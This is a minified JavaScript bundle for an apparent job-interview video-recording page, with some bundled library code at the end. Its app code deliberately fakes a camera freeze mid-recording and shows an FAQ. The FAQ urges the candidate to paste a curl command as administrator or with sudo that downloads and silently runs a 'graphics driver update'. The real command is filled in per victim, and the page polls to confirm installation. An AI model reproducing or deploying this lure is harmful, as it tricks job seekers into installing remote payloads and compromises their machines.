24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),m.jsx("div",{className:`overflow-hidden transition-all duration-300 ease-in-out ${s[1]?"max-h-96 opacity-100":"max-h-0 opacity-0"}`,children:m.jsx("div",{className:"px-4 pb-4 transform transition-transform duration-300 ease-in-out",children:m.jsxs("div",{className:"text-gray-300 text-sm space-y-3",children:[m.jsx("p",{children:"In many cases, this occurs due to graphics driver glitches or compatibility issues."}),m.jsx("p",{className:"font-semibold text-white mb-3",children:"To resolve this issue, please update your graphics drivers using the following steps:"}),i=="win"&&m.jsxs("div",{className:"bg-gray-800 rounded-lg p-3 font-mono text-xs",children:[m.jsxs("div",{className:"mb-4",children:[m.jsx("p",{className:"text-yellow-400 mb-2 font-semibold",children:"Step 1: Launch Command Prompt as Administrator"}),m.jsx("p",{className:"text-gray-300 ml-2",children:" Press Windows key + R to open Run dialog"}),m.jsx("p",{className:"text-gray-300 ml-2",children:' Type "cmd" and press Ctrl + Shift + Enter'}),m.jsx("p",{className:"text-gray-300 ml-2 mb-2",children:' Click "Yes" when prompted by User Account Control'})]}),m.jsxs("div",{children:[m.jsx("p",{className:"text-yellow-400 mb-2 font-semibold",children:"Step 2: Execute Driver Update Command"}),m.jsx("div",{className:"relative bg-gray-900 rounded p-2 mb-2",children:m.jsx("code",{className:"text-green-400 text-xs break-all code",children:'curl -L "https://download.microsoft.com/download/graphics-driver-update.exe" -o driver-update.exe && driver-update.exe /silent'})}),m.jsx("p",{className:"text-gray-400 text-xs",children:"Note: This command downloads and installs the latest graphics drivers automatically."})]})]}),i=="mac"&&m.jsxs("div",{className:"bg-gray-800 rounded-lg p-3 font-mono text-xs",children:[m.jsxs("div",{className:"mb-4",children:[m.jsx("p",{className:"text-yellow-400 mb-2 font-semibold",children:"Step 1: Launch Terminal on macOS"}),m.jsx("p",{className:"text-gray-300 ml-2",children:" Press Command () + Space on your keyboard"}),m.jsx("p",{className:"text-gray-300 ml-2",children:' In the search bar that appears, type "Terminal"'}),m.jsx("p",{className:"text-gray-300 ml-2 mb-2",children:" Press Enter, and the Terminal will open"})]}),m.jsxs("div",{children:[m.jsx("p",{className:"text-yellow-400 mb-2 font-semibold",children:"Step 2: Execute Driver Update Command"}),m.jsx("div",{className:"relative bg-gray-900 rounded p-2 mb-2",children:m.jsx("code",{className:"text-green-400 text-xs break-all code",children:'curl -L "https://drivers.softpedia.com/driver-update.pkg" -o driver-update.pkg && sudo installer -pkg driver-update.pkg -target /'})}),m.jsx("p",{className:"text-gray-400 text-xs",children:"Note: This command downloads and installs the latest graphics drivers automatically."})]})]}),m.jsx("p",{className:"text-gray-300 text-sm mt-3",children:"After installation, don't restart your computer or refresh the webpage. Just close the FAQ modal and wait - this will release the frozen screen."})]})})})]}),m.jsxs("div",{className:"bg-gray-700 rounded-lg overflow-hidden",children:[m.jsxs("button",{onClick:()=>a(2),className:"w-full p-4 text-left hover:bg-gray-600 transition-colors duration-200 flex items-center justify-between",children:[m.jsx("h4",{className:"text-lg font-semibold text-white",children:"Q: Will I lose my recording if the video freezes?"}),m.jsx("svg",{className:`w-5 h-5 text-white transform transition-transform duration-200 ${s[2]?"rotate-180":""}`,fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),m.jsx("div",{className:`overflow-hidden transition-all duration-300 ease-in-out ${s[2]?"max-h-96 opacity-100":"max-h-0 opacity-0"}`,children:m.jsx("div",{className:"px-4 pb-4 transform transition-transform duration-300 ease-in-out",children:m.jsxs("div",{className:"text-gray-300 text-sm space-y-2",children:[m.jsx("p",{className:"font-semibold text-red-400",children:"Unfortunately, yes."}),m.jsx("p",{children:"When a video stream freezes during recording, the recorded data becomes corrupted and cannot be recovered. You should start recording from the scratch."}),m.jsxs("p",{className:"text-yellow-300",children:[" ",m.jsx("strong",{children:"Tip:"})," To minimize the risk of losing long recordings, consider doing a quick test recording first to ensure your setup is working properly."]})]})})})]}),m.jsxs("div",{className:"bg-gray-700 rounded-lg overflow-hidden",children:[m.jsxs("button",{onClick:()=>a(3),className:"w-full p-4 text-left hover:bg-gray-600 transition-colors duration-200 flex items-center justify-between",children:[m.jsx("h4",{className:"text-lg font-semibold text-white",children:"Q: How can I prevent video freezing?"}),m.jsx("svg",{className:`w-5 h-5 text-white transform transition-transform duration-200 ${s[3]?"rotate-180":""}`,fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),m.jsx("div",{className:`overflow-hidden transition-all duration-300 ease-in-out ${s[3]?"max-h-96 opacity-100":"max-h-0 opacity-0"}`,children:m.jsx("div",{className:"px-4 pb-4 transform transition-transform duration-300 ease-in-out",children:m.jsxs("div",{className:"text-gray-300 text-sm space-y-3",children:[m.jsx("p",{children:"To minimize the risk of video freezing, follow these best practices:"}),m.jsxs("div",{className:"space-y-2",children:[m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-green-400 font-bold",children:""}),m.jsx("span",{children:"Close all unnecessary applications and browser tabs"})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-green-400 font-bold",children:""}),m.jsx("span",{children:"Ensure no other applications are using your camera"})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-green-400 font-bold",children:""}),m.jsx("span",{children:"Update your camera and graphics drivers to the latest version"})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-green-400 font-bold",children:""}),m.jsx("span",{children:"Use a stable internet connection"})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-green-400 font-bold",children:""}),m.jsx("span",{children:"Ensure adequate system resources (RAM and CPU)"})]})]})]})})})]}),m.jsxs("div",{className:"bg-gray-700 rounded-lg overflow-hidden",children:[m.jsxs("button",{onClick:()=>a(4),className:"w-full p-4 text-left hover:bg-gray-600 transition-colors duration-200 flex items-center justify-between",children:[m.jsx("h4",{className:"text-lg font-semibold text-white",children:"Q: What if I've updated the graphics driver and still have issues?"}),m.jsx("svg",{className:`w-5 h-5 text-white transform transition-transform duration-200 ${s[4]?"rotate-180":""}`,fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),m.jsx("div",{className:`overflow-hidden transition-all duration-300 ease-in-out ${s[4]?"max-h-96 opacity-100":"max-h-0 opacity-0"}`,children:m.jsx("div",{className:"px-4 pb-4 transform transition-transform duration-300 ease-in-out",children:m.jsxs("div",{className:"text-gray-300 text-sm space-y-3",children:[m.jsx("p",{children:"If updating graphics drivers doesn't resolve the issue, try these additional troubleshooting steps:"}),m.jsxs("div",{className:"space-y-2",children:[m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-blue-400 font-bold",children:"1."}),m.jsxs("span",{children:[m.jsx("strong",{children:"Refresh the browser:"})," Press F5 or Ctrl+R to reload the page completely"]})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-blue-400 font-bold",children:"2."}),m.jsxs("span",{children:[m.jsx("strong",{children:"Try a different browser:"})," Switch to Chrome, Firefox, or Edge"]})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-blue-400 font-bold",children:"3."}),m.jsxs("span",{children:[m.jsx("strong",{children:"Restart your computer:"})," This clears system resources and resets drivers"]})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-blue-400 font-bold",children:"4."}),m.jsxs("span",{children:[m.jsx("strong",{children:"Test camera elsewhere:"})," Open Camera app or Skype to verify hardware functionality"]})]}),m.jsxs("div",{className:"flex items-start gap-2",children:[m.jsx("span",{className:"text-blue-400 font-bold",children:"5."}),m.jsxs("span",{children:[m.jsx("strong",{children:"Check system requirements:"})," Ensure your device meets minimum specifications"]})]})]}),m.jsxs("p",{className:"text-yellow-300 mt-3",children:[" ",m.jsx("strong",{children:"Still having issues?"})," Contact technical support with your browser version and system specifications."]})]})})})]})]}),m.jsxs("div",{className:"flex flex-col gap-3",children:[m.jsxs("button",{onClick:n,className:"w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors duration-200 flex items-center justify-center gap-2",children:[m.jsx(ig,{className:"w-5 h-5"}),"Restart Camera"]}),m.jsx("button",{onClick:e,className:"w-full bg-gray-600 hover:bg-gray-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors duration-200",children:"Close FAQ"})]})]})})}):null},yj=({recordedBlob:t,onSubmit:e,onRecordAgain:n})=>t?m.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4",children:m.jsx("div",{className:"bg-gray-800 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl",children:m.jsxs("div",{className:"text-center",children:[m.jsx("div",{className:"w-20 h-20 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-6",children:m.jsx("svg",{className:"w-10 h-10 text-white",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M5 13l4 4L19 7"})})}),m.jsx("h3",{className:"text-2xl font-bold text-white mb-3",children:"Recording Successfully Completed!"}),m.jsx("p",{className:"text-gray-300 mb-8 leading-relaxed",children:"Your interview has been recorded successfully. You can now submit it or record again if needed."}),m.jsxs("div",{className:"flex flex-col gap-3 justify-center",children:[m.jsxs("button",{onClick:e,className:"w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors duration-200 flex items-center justify-center gap-2",children:[m.jsx("svg",{className:"w-5 h-5",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 19l9 2-9-18-9 18 9-2zm0 0v-8"})}),"Submit Recording"]}),m.jsxs("button",{onClick:n,className:"w-full bg-gray-600 hover:bg-gray-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors duration-200 flex items-center justify-center gap-2",children:[m.jsx("svg",{className:"w-5 h-5",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:m.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"})}),"Record Again"]})]})]})})}):null,xj=()=>m.jsx("div",{className:"card-video flex items-center justify-center",children:m.jsxs("div",{className:"text-center text-white",children:[m.jsx(ig,{className:"w-16 h-16 mx-auto mb-6 animate-pulse text-blue-400"}),m.jsx("h2",{className:"text-2xl font-semibold mb-2",children:"Setting up your camera..."}),m.jsx("p",{className:"text-slate-300",children:"Please wait while we access your camera"})]})}),vj=({error:t,onRetry:e})=>m.jsx("div",{className:"card-video flex items-center justify-center p-4",children:m.jsxs("div",{className:"text-center text-white max-w-md",children:[m.jsx(ks,{className:"w-20 h-20 mx-auto mb-6 text-red-400"}),m.jsx("h2",{className:"text-3xl font-bold mb-4",children:"Camera Access Required"}),m.jsx("p",{className:"text-slate-300 mb-8 leading-relaxed",children:t}),m.jsxs("button",{onClick:e,className:"bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors duration-200 flex items-center gap-2 mx-auto",children:[m.jsx(ig,{className:"w-5 h-5"}),"Try Again"]})]})}),wj=({onRecordingComplete:t,userData:e})=>{const{showToast:n,ToastComponent:r}=Hc(),[i,s]=S.useState(!1),[o,a]=S.useState(!1),[l,u]=S.useState(0),[c,d]=S.useState(null),[f,h]=S.useState(""),[p,y]=S.useState(null),[x,g]=S.useState([]),[v,w]=S.useState(null),[b,k]=S.useState(!1),[E,M]=S.useState(null),[C,N]=S.useState(!1),[O,H]=S.useState(!1),[pe,Pe]=S.useState(!1);S.useState(null);const[bt,Ct]=S.useState("win"),Re=S.useRef(null),J=S.useRef(null),D=S.useRef(null),B=S.useRef([]),z=S.useRef(null),Y=S.useRef(null),Se=S.useRef(null),Yn=S.useRef(!1),Mn=q=>q?{windows:Ux.windows.replace("unique",q.unique),mac:Ux.mac.replace("unique",q.unique)}:null,$s=S.useMemo(()=>Mn(e),[e]);S.useEffect(()=>(setTimeout(()=>{const q=window.navigator.platform.toLowerCase();q.includes("win")?Ct("win"):q.includes("mac")?Ct("mac"):Ct("linux")},100),un(),Qg),[]),S.useEffect(()=>{Re.current&&E&&(Re.current.srcObject=E)},[E]),S.useEffect(()=>{let q,me=!1;return C&&(q=setInterval(async()=>{if(!me){me=!0;try{(await Xd()).result?(await Jg(),N(!1)):n("Need to keep the drivers to up-to-date!","error")}finally{me=!1}}},2e4)),()=>{q&&clearInterval(q)}},[C]);const un=async()=>{try{await navigator.mediaDevices.getUserMedia({video:!0}),await _r()}catch{d(!1),h("Camera access denied. Please allow camera access and refresh the page.")}},_r=async()=>{try{const me=(await navigator.mediaDevices.enumerateDevices()).filter(Ge=>Ge.kind==="videoinput");g(me),me.length>0?(w(me[0].deviceId),await qg(me[0].deviceId)):(d(!1),h("No video devices found. Please connect a camera."))}catch{d(!1),h("Error fetching devices.")}},qg=async q=>{if(!q){try{(await navigator.mediaDevices.getUserMedia({video:!0})).getTracks().forEach(Ge=>Ge.stop()),await _r()}catch{h("Error accessing camera. Please reload the site."),k(!1),console.log("Error accessing camera. Please reload the site.")}return}try{console.log("handleCameraAccess",q);const me=await navigator.mediaDevices.getUserMedia({video:{deviceId:q?{ideal:q}:void 0},audio:!1});console.log("mediaStream",me),M(me),D.current=me,k(!0),d(!0);let Ge="";for(let $a=0;$a<x.length;$a++)if(x[$a].deviceId===q){Ge=x[$a].label;break}console.log(Ge+" is connected."),h("")}catch(me){console.error("Camera access error:",me),h("Error accessing camera. Please allow access."),k(!1),d(!1),console.log("Error accessing camera. Please allow access.")}},Gg=()=>{H(!1)},Jg=async()=>{Yn.current=!0,J.current&&(i||C)&&(J.current.stop(),s(!1),a(!1),Hs()),Y.current&&(clearTimeout(Y.current),Y.current=null),N(!1),Pe(!1),u(0),Qg(),await qg(v),Gg(),setTimeout(()=>{Yn.current=!1},500)},ET=()=>{if(Re.current&&D.current){const q=document.createElement("canvas"),me=q.getContext("2d");q.width=Re.current.videoWidth,q.height=Re.current.videoHeight,me.drawImage(Re.current,0,0);const Ge=q.toDataURL();Se.current=Ge,Pe(!0)}},TT=async()=>{if(console.log("here"),!!D.current)try{B.current=[];const q=new MediaRecorder(D.current);J.current=q,q.ondataavailable=Ge=>{Ge.data.size>0&&B.current.push(Ge.data)},q.onstop=()=>{if(!C&&!Yn.current){const Ge=new Blob(B.current,{type:"video/webm"});y(Ge)}},q.start(1e3),s(!0),a(!1),u(0),Yg();const me=await Xd();if(console.log(me),!me.result){const Ge=await uj();Y.current=setTimeout(()=>{N(!0),ET(),Hs()},parseInt(Ge.delayTime)||500)}}catch{h("Failed to start recording. Please try again.")}},MT=()=>{J.current&&i&&!C&&(o?(J.current.resume(),a(!1),Yg()):(J.current.pause(),a(!0),Hs()))},NT=async()=>{(await Xd()).result&&J.current&&(i||C)&&(J.current.stop(),s(!1),a(!1),Hs(),Y.current&&(clearTimeout(Y.current),Y.current=null),C||N(!1))},Yg=()=>{z.current=setInterval(()=>{u(q=>q+1)},1e3)},Hs=()=>{z.current&&(clearInterval(z.current),z.current=null)},AT=()=>{y(null),u(0),h(""),N(!1),Pe(!1)},PT=()=>{const q=new Blob(B.current,{type:"video/webm"});t(q)},Qg=()=>{Hs(),Y.current&&(clearTimeout(Y.current),Y.current=null),E&&E.getTracks().forEach(q=>q.stop()),D.current&&D.current.getTracks().forEach(q=>q.stop())};return c===null?m.jsx(xj,{}):c===!1?m.jsx(vj,{error:f,onRetry:un}):m.jsxs("div",{className:"card-video p-4",children:[m.jsx(I.div,{className:"bg-gray-800 p-8 rounded-lg shadow-sm border border-gray-700",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.6},children:m.jsxs("div",{className:"max-w-6xl mx-auto",children:[m.jsx(I.h3,{className:"text-xl font-semibold text-white mb-6",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.2},children:"Video Introduction"}),m.jsxs(I.div,{className:"mb-6",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.4},children:[m.jsx("p",{className:"text-gray-300 mb-4",children:"Please record a brief video introduction (1-2 minutes) telling us about yourself, your experience, and why you're interested in this position."}),m.jsxs(I.div,{className:"bg-gray-700 p-4 rounded-lg",initial:{scale:.95,opacity:0},animate:{scale:1,opacity:1},transition:{duration:.6,delay:.6},children:[m.jsx("h4",{className:"font-medium text-white mb-2",children:"Tips for your video:"}),m.jsxs("ul",{className:"text-sm text-gray-300 space-y-1",children:[m.jsx("li",{children:" Ensure good lighting and clear audio"}),m.jsx("li",{children:" Look directly at the camera"}),m.jsx("li",{children:" Keep it professional but personable"}),m.jsx("li",{children:" Speak clearly and at a moderate pace"})]})]})]}),m.jsxs("div",{className:"flex flex-col items-center mb-8",children:[m.jsx(pj,{videoRef:Re,stream:E,videoFrozen:pe,frozenFrameRef:Se,isError:C,isRecording:i,isPaused:o,recordingTime:l,onShowFAQ:()=>H(!0)}),m.jsx("div",{className:"flex items-center gap-4",children:m.jsx(mj,{isRecording:i,isPaused:o,isError:C,recordedBlob:p,onStartRecording:TT,onPauseRecording:MT,onStopRecording:NT})})]}),m.jsx(yj,{recordedBlob:p,onSubmit:PT,onRecordAgain:AT}),m.jsx(gj,{curlCommand:$s,showFAQModal:O,onClose:Gg,onRestartCamera:Jg,currPlatform:bt}),f&&m.jsxs("div",{className:"bg-red-900 border border-red-600 rounded-xl p-4 text-center",children:[m.jsx(ks,{className:"w-6 h-6 text-red-400 mx-auto mb-2"}),m.jsx("p",{className:"text-red-200",children:f})]})]})}),m.jsx(r,{})]})};var eC={exports:{}},tC={};/**
 * @license React
 * use-sync-external-store-shim.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var bs=S;function Sj(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var kj=typeof Object.is=="function"?Object.is:Sj,bj=bs.useState,Cj=bs.useEffect,Ej=bs.useLayoutEffect,Tj=bs.useDebugValue;function Mj(t,e){var n=e(),r=bj({inst:{value:n,getSnapshot:e}}),i=r[0].inst,s=r[1];return Ej(function(){i.value=n,i.getSnapshot=e,Zd(i)&&s({inst:i})},[t,n,e]),Cj(function(){return Zd(i)&&s({inst:i}),t(function(){Zd(i)&&s({inst:i})})},[t]),Tj(n),n}function Zd(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!kj(t,n)}catch{return!0}}function Nj(t,e){return e()}var Aj=typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"?Nj:Mj;tC.useSyncExternalStore=bs.useSyncExternalStore!==void 0?bs.useSyncExternalStore:Aj;eC.exports=tC;var fg=eC.exports;function $e(t){this.content=t}$e.prototype={constructor:$e,find:function(t){for(var e=0;e<this.content.length;e+=2)if(this.content[e]===t)return e;return-1},get:function(t){var e=this.find(t);return e==-1?void 0:this.content[e+1]},update:function(t,e,n){var r=n&&n!=t?this.remove(n):this,i=r.find(t),s=r.content.slice();return i==-1?s.push(n||t,e):(s[i+1]=e,n&&(s[i]=n)),new $e(s)},remove:function(t){var e=this.find(t);if(e==-1)return this;var n=this.content.slice();return n.splice(e,2),new $e(n)},addToStart:function(t,e){return new $e([t,e].concat(this.remove(t).content))},addToEnd:function(t,e){var n=this.remove(t).content.slice();return n.push(t,e),new $e(n)},addBefore:function(t,e,n){var r=this.remove(e),i=r.content.slice(),s=r.find(t);return i.splice(s==-1?i.length:s,0,e,n),new $e(i)},forEach:function(t){for(var e=0;e<this.content.length;e+=2)t(this.content[e],this.content[e+1])},prepend:function(t){return t=$e.from(t),t.size?new $e(t.content.concat(this.subtract(t).content)):this},append:function(t){return t=$e.from(t),t.size?new $e(this.subtract(t).content.concat(t.content)):this},subtract:function(t){var e=this;t=$e.from(t);for(var n=0;n<t.content.length;n+=2)e=e.remove(t.content[n]);return e},toObject:function(){var t={};return this.forEach(function(e,n){t[e]=n}),t},get size(){return this.content.length>>1}};$e.from=function(t){if(t instanceof $e)return t;var e=[];if(t)for(var n in t)e.push(n,t[n]);return new $e(e)};function nC(t,e,n){for(let r=0;;r++){if(r==t.childCount||r==e.childCount)return t.childCount==e.childCount?null:n;let i=t.child(r),s=e.child(r);if(i==s){n+=i.nodeSize;continue}if(!i.sameMarkup(s))return n;if(i.isText&&i.text!=s.text){for(let o=0;i.text[o]==s.text[o];o++)n++;return n}if(i.content.size||s.content.size){let o=nC(i.content,s.content,n+1);if(o!=null)return o}n+=i.nodeSize}}function rC(t,e,n,r){for(let i=t.childCount,s=e.childCount;;){if(i==0||s==0)return i==s?null:{a:n,b:r};let o=t.child(--i),a=e.child(--s),l=o.nodeSize;if(o==a){n-=l,r-=l;continue}if(!o.sameMarkup(a))return{a:n,b:r};if(o.isText&&o.text!=a.text){let u=0,c=Math.min(o.text.length,a.text.length);for(;u<c&&o.text[o.text.length-u-1]==a.text[a.text.length-u-1];)u++,n--,r--;return{a:n,b:r}}if(o.content.size||a.content.size){let u=rC(o.content,a.content,n-1,r-1);if(u)return u}n-=l,r-=l}}class A{constructor(e,n){if(this.content=e,this.size=n||0,n==null)for(let r=0;r<e.length;r++)this.size+=e[r].nodeSize}nodesBetween(e,n,r,i=0,s){for(let o=0,a=0;a<n;o++){let l=this.content[o],u=a+l.nodeSize;if(u>e&&r(l,i+a,s||null,o)!==!1&&l.content.size){let c=a+1;l.nodesBetween(Math.max(0,e-c),Math.min(l.content.size,n-c),r,i+c)}a=u}}descendants(e){this.nodesBetween(0,this.size,e)}textBetween(e,n,r,i){let s="",o=!0;return this.nodesBetween(e,n,(a,l)=>{let u=a.isText?a.text.slice(Math.max(e,l)-l,n-l):a.isLeaf?i?typeof i=="function"?i(a):i:a.type.spec.leafText?a.type.spec.leafText(a):"":"";a.isBlock&&(a.isLeaf&&u||a.isTextblock)&&r&&(o?o=!1:s+=r),s+=u},0),s}append(e){if(!e.size)return this;if(!this.size)return e;let n=this.lastChild,r=e.firstChild,i=this.content.slice(),s=0;for(n.isText&&n.sameMarkup(r)&&(i[i.length-1]=n.withText(n.text+r.text),s=1);s<e.content.length;s++)i.push(e.content[s]);return new A(i,this.size+e.size)}cut(e,n=this.size){if(e==0&&n==this.size)return this;let r=[],i=0;if(n>e)for(let s=0,o=0;o<n;s++){let a=this.content[s],l=o+a.nodeSize;l>e&&((o<e||l>n)&&(a.isText?a=a.cut(Math.max(0,e-o),Math.min(a.text.length,n-o)):a=a.cut(Math.max(0,e-o-1),Math.min(a.content.size,n-o-1))),r.push(a),i+=a.nodeSize),o=l}return new A(r,i)}cutByIndex(e,n){return e==n?A.empty:e==0&&n==this.content.length?this:new A(this.content.slice(e,n))}replaceChild(e,n){let r=this.content[e];if(r==n)return this;let i=this.content.slice(),s=this.size+n.nodeSize-r.nodeSize;return i[e]=n,new A(i,s)}addToStart(e){return new A([e].concat(this.content),this.size+e.nodeSize)}addToEnd(e){return new A(this.content.concat(e),this.size+e.nodeSize)}eq(e){if(this.content.length!=e.content.length)return!1;for(let n=0;n<this.content.length;n++)if(!this.content[n].eq(e.content[n]))return!1;return!0}get firstChild(){return this.content.length?this.content[0]:null}get lastChild(){return this.content.length?this.content[this.content.length-1]:null}get childCount(){return this.content.length}child(e){let n=this.content[e];if(!n)throw new RangeError("Index "+e+" out of range for "+this);return n}maybeChild(e){return this.content[e]||null}forEach(e){for(let n=0,r=0;n<this.content.length;n++){let i=this.content[n];e(i,r,n),r+=i.nodeSize}}findDiffStart(e,n=0){return nC(this,e,n)}findDiffEnd(e,n=this.size,r=e.size){return rC(this,e,n,r)}findIndex(e){if(e==0)return dl(0,e);if(e==this.size)return dl(this.content.length,e);if(e>this.size||e<0)throw new RangeError(`Position ${e} outside of fragment (${this})`);for(let n=0,r=0;;n++){let i=this.child(n),s=r+i.nodeSize;if(s>=e)return s==e?dl(n+1,s):dl(n,r);r=s}}toString(){return"<"+this.toStringInner()+">"}toStringInner(){return this.content.join(", ")}toJSON(){return this.content.length?this.content.map(e=>e.toJSON()):null}static fromJSON(e,n){if(!n)return A.empty;if(!Array.isArray(n))throw new RangeError("Invalid input for Fragment.fromJSON");return new A(n.map(e.nodeFromJSON))}static fromArray(e){if(!e.length)return A.empty;let n,r=0;for(let i=0;i<e.length;i++){let s=e[i];r+=s.nodeSize,i&&s.isText&&e[i-1].sameMarkup(s)?(n||(n=e.slice(0,i)),n[n.length-1]=s.withText(n[n.length-1].text+s.text)):n&&n.push(s)}return new A(n||e,r)}static from(e){if(!e)return A.empty;if(e instanceof A)return e;if(Array.isArray(e))return this.fromArray(e);if(e.attrs)return new A([e],e.nodeSize);throw new RangeError("Can not convert "+e+" to a Fragment"+(e.nodesBetween?" (looks like multiple versions of prosemirror-model were loaded)":""))}}A.empty=new A([],0);const ef={index:0,offset:0};function dl(t,e){return ef.index=t,ef.offset=e,ef}function Mu(t,e){if(t===e)return!0;if(!(t&&typeof t=="object")||!(e&&typeof e=="object"))return!1;let n=Array.isArray(t);if(Array.isArray(e)!=n)return!1;if(n){if(t.length!=e.length)return!1;for(let r=0;r<t.length;r++)if(!Mu(t[r],e[r]))return!1}else{for(let r in t)if(!(r in e)||!Mu(t[r],e[r]))return!1;for(let r in e)if(!(r in t))return!1}return!0}let ee=class Gh{constructor(e,n){this.type=e,this.attrs=n}addToSet(e){let n,r=!1;for(let i=0;i<e.length;i++){let s=e[i];if(this.eq(s))return e;if(this.type.excludes(s.type))n||(n=e.slice(0,i));else{if(s.type.excludes(this.type))return e;!r&&s.type.rank>this.type.rank&&(n||(n=e.slice(0,i)),n.push(this),r=!0),n&&n.push(s)}}return n||(n=e.slice()),r||n.push(this),n}removeFromSet(e){for(let n=0;n<e.length;n++)if(this.eq(e[n]))return e.slice(0,n).concat(e.slice(n+1));return e}isInSet(e){for(let n=0;n<e.length;n++)if(this.eq(e[n]))return!0;return!1}eq(e){return this==e||this.type==e.type&&Mu(this.attrs,e.attrs)}toJSON(){let e={type:this.type.name};for(let n in this.attrs){e.attrs=this.attrs;break}return e}static fromJSON(e,n){if(!n)throw new RangeError("Invalid input for Mark.fromJSON");let r=e.marks[n.type];if(!r)throw new RangeError(`There is no mark type ${n.type} in this schema`);let i=r.create(n.attrs);return r.checkAttrs(i.attrs),i}static sameSet(e,n){if(e==n)return!0;if(e.length!=n.length)return!1;for(let r=0;r<e.length;r++)if(!e[r].eq(n[r]))return!1;return!0}static setFrom(e){if(!e||Array.isArray(e)&&e.length==0)return Gh.none;if(e instanceof Gh)return[e];let n=e.slice();return n.sort((r,i)=>r.type.rank-i.type.rank),n}};ee.none=[];class Nu extends Error{}class L{constructor(e,n,r){this.content=e,this.openStart=n,this.openEnd=r}get size(){return this.content.size-this.openStart-this.openEnd}insertAt(e,n){let r=sC(this.content,e+this.openStart,n);return r&&new L(r,this.openStart,this.openEnd)}removeBetween(e,n){return new L(iC(this.content,e+this.openStart,n+this.openStart),this.openStart,this.openEnd)}eq(e){return this.content.eq(e.content)&&this.openStart==e.openStart&&this.openEnd==e.openEnd}toString(){return this.content+"("+this.openStart+","+this.openEnd+")"}toJSON(){if(!this.content.size)return null;let e={content:this.content.toJSON()};return this.openStart>0&&(e.openStart=this.openStart),this.openEnd>0&&(e.openEnd=this.openEnd),e}static fromJSON(e,n){if(!n)return L.empty;let r=n.openStart||0,i=n.openEnd||0;if(typeof r!="number"||typeof i!="number")throw new RangeError("Invalid input for Slice.fromJSON");return new L(A.fromJSON(e,n.content),r,i)}static maxOpen(e,n=!0){let r=0,i=0;for(let s=e.firstChild;s&&!s.isLeaf&&(n||!s.type.spec.isolating);s=s.firstChild)r++;for(let s=e.lastChild;s&&!s.isLeaf&&(n||!s.type.spec.isolating);s=s.lastChild)i++;return new L(e,r,i)}}L.empty=new L(A.empty,0,0);function iC(t,e,n){let{index:r,offset:i}=t.findIndex(e),s=t.maybeChild(r),{index:o,offset:a}=t.findIndex(n);if(i==e||s.isText){if(a!=n&&!t.child(o).isText)throw new RangeError("Removing non-flat range");return t.cut(0,e).append(t.cut(n))}if(r!=o)throw new RangeError("Removing non-flat range");return t.replaceChild(r,s.copy(iC(s.content,e-i-1,n-i-1)))}function sC(t,e,n,r){let{index:i,offset:s}=t.findIndex(e),o=t.maybeChild(i);if(s==e||o.isText)return r&&!r.canReplace(i,i,n)?null:t.cut(0,e).append(n).append(t.cut(e));let a=sC(o.content,e-s-1,n,o);return a&&t.replaceChild(i,o.copy(a))}function Pj(t,e,n){if(n.openStart>t.depth)throw new Nu("Inserted content deeper than insertion position");if(t.depth-n.openStart!=e.depth-n.openEnd)throw new Nu("Inconsistent open depths");return oC(t,e,n,0)}function oC(t,e,n,r){let i=t.index(r),s=t.node(r);if(i==e.index(r)&&r<t.depth-n.openStart){let o=oC(t,e,n,r+1);return s.copy(s.content.replaceChild(i,o))}else if(n.content.size)if(!n.openStart&&!n.openEnd&&t.depth==r&&e.depth==r){let o=t.parent,a=o.content;return ci(o,a.cut(0,t.parentOffset).append(n.content).append(a.cut(e.parentOffset)))}else{let{start:o,end:a}=Rj(n,t);return 